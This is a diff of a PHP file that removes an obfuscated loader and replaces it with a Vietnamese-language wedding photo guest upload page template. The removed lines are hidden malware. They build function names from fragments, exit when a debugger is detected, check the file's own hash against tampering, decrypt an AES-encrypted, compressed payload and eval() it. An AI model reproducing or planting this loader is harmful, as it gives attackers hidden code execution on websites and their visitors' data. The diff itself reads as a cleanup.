@@ -1,28 +1,27 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_hlhhlgkb=('bas'.'e64'.'_de'.'cod'.'e');
-$_v5vmcgu1=('gzu'.'nco'.'mpr'.'ess');
-$_r2wccvwq=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_jzc8yozv='YnUzCaeM';
-$_ddh1sgw9='DbOZfAmC';
-$_nkhvpe6s='0P118jfq';
-$_ii7u5rkr='IEw2Nz/NSLc=';
-$_v5c7jtzv='bPFoad4L';
-$_ytkcyyh6='L+FoPEvy';
-$_fai3qhcr='zqy66iLn';
-$_ngowhyen='V2HkIA==';
-$_rm5uc49o=$_hlhhlgkb($_v5c7jtzv.$_jzc8yozv.$_nkhvpe6s.$_ddh1sgw9.$_ii7u5rkr);
-$_jlbecmuv=$_hlhhlgkb($_fai3qhcr.$_ytkcyyh6.$_ngowhyen);
-$_x5wtst97=$_hlhhlgkb('B0bjBfw0imht1XAeyx4k7MMAbeM/KmaYRs08Cy3STlNMpB6gKXkbRtoaxeor+wB9PsGOgii4zQKtKO6YnQMW5khUVTcpWdTRFsL6sYWDnWnlaa6M2np0iVoOFR3p6LU19YZzddgO3yoTYx+huWT5YCOTaG3812Db5wwwpQZ6MzXC7u58Uqj4IAKI6+2uVWLOMFHtHRs41lfJ4jJeS7x1j1Ihcg+Rrr9T812PE8f9p3sVq8ROIJ5MreAjb0uu7L/iN3TIhE7/Za7Al5BhsDxjcWqcNZvYHd6DWjBt560nXqUzN1GZ7aTTx4enkj/wx5dhXaiN4fR5syO8PqTnuQkKKPQRsnFWcmp/58jksXA9bT58ljjM/MK2UNYwZA2hK5EdVW3hmC3Ua4Jl3Bglnp0Lm2FDAzeAryqUGVNNF6Sq24yfLAZnQb+KrQoKeB4zfAae2DZEDbKEm1mUqerWjMjR+OttxwQ+I+AzLeE/tBpNLW2s0WiCsAvF3G2+DaVwHgD4t3sH49AmfQ7BZ0YEBd4ZeMftTUupE/cJpkhFcxE3WYW/pPgMaMGB4ycfumk2m/EPllrqwE+lp8qV+3It/kv0QkrP2QBWPrLFWwrN2psZlbS2vtG9UMqgLcg7Un0/OHvrxLVuaJ5edMvQd8Az79HYc2xX96nZba3mdTDAKYY8jUchdvrQ468ZgCceX5CJLJ27Bbgu1nx8LxxqJ4giNUzCCVEZ7ifvLQYVBK5al9u+IMdXX94pby0TOexy6j7v7up18R+FHvgh18UkZf8k3jlj9AV19ZnPXOEc56/CtmQOdvdCOctDD4ylnuBpfcqYqAA2oT0SVBWcBVcgOpKFWin+8P+pDHiu6eZHqcdp3Y8s7HZ1RAWScd2mKMt9u9PhdDNB8jD4ZgQEAYHBI/+OyIqpG7lyuL0DqhWwVz5+Y41w0djm8XA8IkaOHXxrn1fKMoFw4uClf6A2jwf8uf2LH2DbRF4Jko1CSUm7k9ulx0G9q2DE8Ceee8kk0wrT7DJiTmj9ZlBaRAUI3YqrOvlUvO86gPihryBYLFwNc3sbWBXBA+tBay5yKVqyopwW5L5VhzTnmZ+kePoZ+tyBkmAsE2Y2+vVMeOrnZTTO8cRWPon42QXeLSKpJcBLZT8a8GEw3CjC/hI1fXTC/YwVWGbvXdoOX+YScK2GFXgy5zTUEA8E7TlOdwjNpxPiexKyoS5YzKEa');
-$_z2rdjzow=$_r2wccvwq($_x5wtst97,'aes-256-cbc',$_rm5uc49o,OPENSSL_RAW_DATA,$_jlbecmuv);
-if($_z2rdjzow===false){exit;}
-$_fjfw0d1q=$_v5vmcgu1($_z2rdjzow);
-if($_fjfw0d1q===false){exit;}
-$_z17npcqv='89d9283c402b17ae774eb89a06ba1b8b48d9cc58d52d869065f01be9c2f26c91';
-$_m9c1tbpw=@file_get_contents(__FILE__);
-if($_m9c1tbpw!==false){
-$_kfryanul=str_replace($_z17npcqv,"0000000000000000000000000000000000000000000000000000000000000000",$_m9c1tbpw);
-$_jj41aaak=hash("sha256",$_kfryanul);
-if($_jj41aaak!==$_z17npcqv){@http_response_code(403);exit;}
-}
-eval($_fjfw0d1q);
+ defined('BASEPATH') OR exit('No direct script access allowed'); ?>
+<section class="wrap narrow upload-page">
+  <h1 class="page-title"><?= e(__('Gửi ảnh cho {cap_doi}', array('cap_doi' => $couple))) ?></h1>
+  <p class="muted"><?= e(__('Ảnh sẽ vào album')) ?> <b><?= e($album['title']) ?></b><?= $settings['guest_upload_approval'] === '1' ? ' ' . e(__('sau khi cô dâu chú rể xem qua')) : '' ?>. <?= e(__('Chọn nhiều ảnh một lúc được nhé.')) ?></p>
+
+  <form class="guest-upload" data-guest-upload
+        data-endpoint="<?= base_url('gui-anh/upload') ?>"
+        data-album="<?= e($album['slug']) ?>"
+        data-max-mb="<?= (int) $max_mb ?>"
+        data-approval="<?= $settings['guest_upload_approval'] === '1' ? '1' : '0' ?>">
+    <label><?= e(__('Tên của bạn')) ?> <small><?= e(__('(không bắt buộc)')) ?></small><input name="guest_name" maxlength="60" autocomplete="name" placeholder="<?= e(__('Ví dụ: Lan – bạn thân cô dâu')) ?>"></label>
+    <label><?= e(__('Lời nhắn kèm ảnh')) ?> <small><?= e(__('(không bắt buộc)')) ?></small><input name="guest_message" maxlength="300"></label>
+
+    <label class="drop" data-drop>
+      <input type="file" accept="image/*" multiple data-files>
+      <span class="drop-big">＋</span>
+      <span><?= e(__('Chạm để chọn ảnh từ điện thoại')) ?></span>
+      <small><?= e(__('JPG, PNG, WEBP · tối đa {n} MB mỗi ảnh', array('n' => (int) $max_mb))) ?></small>
+    </label>
+
+    <div class="up-summary" data-summary hidden></div>
+    <ul class="up-list" data-list></ul>
+  </form>
+  <p class="center"><a class="back" href="<?= base_url() ?>">← <?= e(__('Về trang chính')) ?></a></p>
+</section>
+<script src="<?= asset_url('js/uploader.js') ?>"></script>
